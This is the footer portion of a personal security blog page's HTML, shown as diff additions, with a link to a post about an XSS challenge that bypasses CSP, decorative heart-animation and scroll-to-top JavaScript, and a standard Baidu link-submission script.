+          <a href="/2019/02/21/一道绕过CSP的XSS题目/" rel="prev" title="一道绕过CSP的XSS题目">
+            一道绕过CSP的XSS题目
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">本站总访问量 <span id="busuanzi_value_site_pv"></span> 次</span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
